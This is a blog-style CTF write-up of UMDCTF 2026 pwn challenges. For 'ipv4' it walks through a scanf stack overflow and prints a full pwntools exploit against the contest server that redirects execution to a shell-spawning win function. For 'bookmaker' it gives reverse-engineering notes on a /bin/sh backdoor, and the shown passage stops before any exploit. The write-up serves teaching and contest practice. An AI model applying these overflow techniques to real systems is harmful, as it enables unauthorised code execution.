+				<a href=https://yhalo.cn/category/article/wp/ class='badge badge-secondary tag'>wp <span class='tag-num'>29</span></a><a href=https://yhalo.cn/category/about/ class='badge badge-secondary tag'>关于 <span class='tag-num'>0</span></a><a href=https://yhalo.cn/category/article/%e6%8a%80%e6%9c%af/ class='badge badge-secondary tag'>技术 <span class='tag-num'>8</span></a><a href=https://yhalo.cn/category/article/ class='badge badge-secondary tag'>文章 <span class='tag-num'>43</span></a><a href=https://yhalo.cn/category/article/%e7%ac%94%e8%ae%b0/ class='badge badge-secondary tag'>笔记 <span class='tag-num'>5</span></a>			</div>
+		</div>
+	</div>
+</div>
+<div class="modal fade" id="blog_tags" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">标签</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a href=https://yhalo.cn/tag/555/ class='badge badge-secondary tag'>555 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/agent/ class='badge badge-secondary tag'>agent <span class='tag-num'>2</span></a><a href=https://yhalo.cn/tag/ai/ class='badge badge-secondary tag'>ai <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/bpf/ class='badge badge-secondary tag'>bpf <span class='tag-num'>0</span></a><a href=https://yhalo.cn/tag/copyfail/ class='badge badge-secondary tag'>copyfail <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/ctf/ class='badge badge-secondary tag'>ctf <span class='tag-num'>30</span></a><a href=https://yhalo.cn/tag/cve/ class='badge badge-secondary tag'>cve <span class='tag-num'>2</span></a><a href=https://yhalo.cn/tag/fsop/ class='badge badge-secondary tag'>FSOP <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/house-of/ class='badge badge-secondary tag'>House of <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/iot/ class='badge badge-secondary tag'>iot <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/libevent/ class='badge badge-secondary tag'>libevent <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/linux/ class='badge badge-secondary tag'>Linux <span class='tag-num'>2</span></a><a href=https://yhalo.cn/tag/mcp/ class='badge badge-secondary tag'>MCP <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/openharmony/ class='badge badge-secondary tag'>openharmony <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/pwn/ class='badge badge-secondary tag'>pwn <span class='tag-num'>30</span></a><a href=https://yhalo.cn/tag/python/ class='badge badge-secondary tag'>python <span class='tag-num'>11</span></a><a href=https://yhalo.cn/tag/rce/ class='badge badge-secondary tag'>rce <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/rsa/ class='badge badge-secondary tag'>RSA <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/tenda/ class='badge badge-secondary tag'>tenda <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/tricks/ class='badge badge-secondary tag'>tricks <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/v8/ class='badge badge-secondary tag'>V8 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/wordpress/ class='badge badge-secondary tag'>wordpress <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/wp/ class='badge badge-secondary tag'>wp <span class='tag-num'>27</span></a><a href=https://yhalo.cn/tag/wsl/ class='badge badge-secondary tag'>wsl <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/xfce4/ class='badge badge-secondary tag'>xfce4 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/xrdp/ class='badge badge-secondary tag'>xrdp <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/ycb/ class='badge badge-secondary tag'>ycb <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/yubikey/ class='badge badge-secondary tag'>yubikey <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e4%ba%ba%e5%b7%a5%e6%99%ba%e8%83%bd/ class='badge badge-secondary tag'>人工智能 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e5%86%85%e6%a0%b8/ class='badge badge-secondary tag'>内核 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e5%86%85%e6%a0%b8bpf%e5%8a%ab%e6%8c%81/ class='badge badge-secondary tag'>内核bpf劫持 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e5%ae%89%e5%85%a8%e5%af%86%e9%92%a5/ class='badge badge-secondary tag'>安全密钥 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e5%ae%89%e5%85%a8%e6%9e%b6%e6%9e%84/ class='badge badge-secondary tag'>安全架构 <span class='tag-num'>9</span></a><a href=https://yhalo.cn/tag/%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94/ class='badge badge-secondary tag'>应急响应 <span class='tag-num'>2</span></a><a href=https://yhalo.cn/tag/%e5%be%ae%e4%bf%a1/ class='badge badge-secondary tag'>微信 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e6%8a%a5%e9%94%99/ class='badge badge-secondary tag'>报错 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e6%9c%ba%e5%99%a8%e5%ad%a6%e4%b9%a0/ class='badge badge-secondary tag'>机器学习 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e6%b9%be%e5%8c%ba%e6%9d%af/ class='badge badge-secondary tag'>湾区杯 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e7%bd%91%e7%ab%99%e8%bf%81%e7%a7%bb/ class='badge badge-secondary tag'>网站迁移 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e8%81%9a%e7%b1%bb/ class='badge badge-secondary tag'>聚类 <span class='tag-num'>1</span></a><a href=https://yhalo.cn/tag/%e8%b7%af%e7%94%b1%e5%99%a8/ class='badge badge-secondary tag'>路由器 <span class='tag-num'>1</span></a>			</div>
+		</div>
+	</div>
+</div>
+
+<div id="primary" class="content-area">
+	<main id="main" class="site-main" role="main">
+		<article class="post post-full card bg-white shadow-sm border-0" id="post-1978" class="post-1978 post type-post status-publish format-standard has-post-thumbnail hentry category-wp category-article tag-ctf tag-pwn">
+	<header class="post-header text-center">
+		
+				<style>
+					body section.banner {
+						background-image: url(https://yhalo.cn/wp-content/uploads/2026/05/屏幕截图-2026-05-12-105336.png) !important;
+					}
+				</style>		<a class="post-title" href="https://yhalo.cn/1978/umdctf-2026-pwn-wp-by-yhalo/">UMDCTF 2026 Pwn wp by YHalo</a>
+		<div class="post-meta">
+			<div class="post-meta-detail post-meta-detail-time">
+					<i class="fa fa-clock-o" aria-hidden="true"></i>
+					<time title="发布于 2026-5-12 10:52:44 | 编辑于 2026-5-12 10:54:03">2026-5-12 10:52
+					</time>
+				</div> <div class="post-meta-devide">|</div> <div class="post-meta-detail post-meta-detail-categories">
+				<i class="fa fa-bookmark-o" aria-hidden="true"></i> <a href="https://yhalo.cn/category/article/wp/" target="_blank" class="post-meta-detail-catagory-link">wp</a><span class="post-meta-detail-catagory-space">,</span><a href="https://yhalo.cn/category/article/" target="_blank" class="post-meta-detail-catagory-link">文章</a></div> <div class="post-meta-devide">|</div> <div class="post-meta-detail post-meta-detail-views">
+					<i class="fa fa-eye" aria-hidden="true"></i> 657</div>			</br><div class="post-meta-detail post-meta-detail-words">
+		<i class="fa fa-file-word-o" aria-hidden="true"></i><span title="包含 4 行代码"> 1790 字</span>
+		</div>
+		<div class="post-meta-devide">|</div>
+		<div class="post-meta-detail post-meta-detail-words">
+			<i class="fa fa-hourglass-end" aria-hidden="true"></i>
+			10 分钟
+		</div>
+			</div>
+			</header>
+
+	<div class="post-content" id="post_content">
+		
+<h2 class="wp-block-heading">ipv4</h2>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc1.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260427200752963"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">这道题是有后门的</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc2.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260427202102399"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">调用win()的地方看下</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc3.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260427202229234"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">a1不为0.0.0.0，并且要等于100.72.7.67才可以return win</p>
+
+
+
+<p class="wp-block-paragraph">再看下main函数</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc4.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260427204008154"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">函数原型显示有点问题，改改</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc5.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc5.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429102900539"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">要让程序流执行到check_rine</p>
+
+
+
+<p class="wp-block-paragraph">输入的Source Host和Dest Host是valid就可以</p>
+
+
+
+<p class="wp-block-paragraph">一共4个scanf，最后一个scanf限制了输入大小48个字节</p>
+
+
+
+<p class="wp-block-paragraph">最后传入check_rine的参数是v5</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc6.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc6.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429105708916"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">可以发现v5[0]的位置被初始化固定写成0.0.0.0</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc7.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429105856831"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">Desthost碰不到v5[0]</p>
+
+
+
+<p class="wp-block-paragraph">但是调试的时候发现这个payload：b&#8217;1.1.1.1&#8217;+b&#8217;a&#8217;*(0x30-len(&#8216;1.1.1.1&#8217;))</p>
+
+
+
+<p class="wp-block-paragraph">可以让v5[0]为空，这样就绕过了0.0.0.0的检查</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc8.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc8.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429141836103"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">后来查原因，scanf 会自动在字符串末尾加 \x00，我填满了DsetHost后刚好在末尾加\x00就溢出覆盖了v5[0]的头部一点导致破坏了0.0.0.0</p>
+
+
+
+<p class="wp-block-paragraph">但是想要让v5[0]变成100.72.7.67基本不行</p>
+
+
+
+<p class="wp-block-paragraph">只能想办法让SourceHost溢出继续往下覆盖到返回地址retwin,正好SourceHost是scanf(&#8221;%s&#8221;)没有限制</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc9.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc9.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429144427297"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">前面一样是写1.1.1.1，为了绕过地址有效性检查</p>
+
+
+
+<p class="wp-block-paragraph">payload=b&#8217;1.1.1.1&#8217;+b&#8217;a&#8217;*(0x68-len(&#8216;1.1.1.1&#8217;))+p64(win)</p>
+
+
+
+<p class="wp-block-paragraph">最后需要栈对齐一下</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc10.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc10.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429141549932"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">exp</p>
+
+
+
+<pre class="wp-block-code"><code>from pwn import *<br>context(arch='amd64', os='linux',log_level='debug')<br>#io=process('./ipv4')<br>io=remote('challs.umdctf.io',30308)<br>win=0x402F45<br>ret=0x40101a<br>payload1=b'1.1.1.1'+b'a'*(0x68-len('1.1.1.1'))+p64(ret)+p64(win)<br>payload2=b'1.1.1.1'+b'a'*(0x30-len('1.1.1.1'))<br>log.success(payload1)<br>io.recvuntil('What is your Source ASN Prefix?')<br>io.sendline('1.1.1.1')<br>io.recvuntil('What is your Source Host Address?')<br>io.sendline(payload1)<br>io.recvuntil('What is your Destination ASN Prefix?')<br>io.sendline('1.1.1.1')<br>io.recvuntil('What is your Destination Host Address?')<br>io.sendline(payload2)<br>​<br>io.interactive()</code></pre>
+
+
+
+<h2 class="wp-block-heading"><strong>bookmaker</strong></h2>
+
+
+
+<pre class="wp-block-code"><code> &nbsp;  Arch: &nbsp; &nbsp; &nbsp; amd64-64-little<br> &nbsp;  RELRO: &nbsp; &nbsp;  Full RELRO<br> &nbsp;  Stack: &nbsp; &nbsp;  No canary found<br> &nbsp;  NX: &nbsp; &nbsp; &nbsp; &nbsp; NX enabled<br> &nbsp;  PIE: &nbsp; &nbsp; &nbsp;  PIE enabled<br> &nbsp;  FORTIFY: &nbsp;  Enabled<br> &nbsp;  SHSTK: &nbsp; &nbsp;  Enabled<br> &nbsp;  IBT: &nbsp; &nbsp; &nbsp;  Enabled</code></pre>
+
+
+
+<p class="wp-block-paragraph">没有canary</p>
+
+
+
+<p class="wp-block-paragraph">查字符串bin/sh发现后门</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc11.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc11.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504151932494"/></div></figure>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc12.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc12.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260429150714626"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">这个函数很好认,会打印一条 market resolved YES: %s,然后 fflush(stdout),最后 system(&#8220;/bin/sh&#8221;)</p>
+
+
+
+<p class="wp-block-paragraph">顺手再看看上面的market resolved NO</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc13.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc13.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504152442113"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">查看引用，sub_B980</p>
+
+
+
+<p class="wp-block-paragraph">这里创建了一个0x30的对象结构体，并且把subB390这个函数回调放进去，作为resolver</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc14.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc14.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504160158823"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">sub_B390还有一个引用在主函数里</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc15.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc15.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504221751711"/></div></figure>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc16.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc16.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504221809071"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">subB890被主函数引用，被映射为mintWire这个脚本层名字</p>
+
+
+
+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc17.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc17.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20260504160544070"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">主函数是一个嵌入式js脚本执行终端</p>
+
+
+
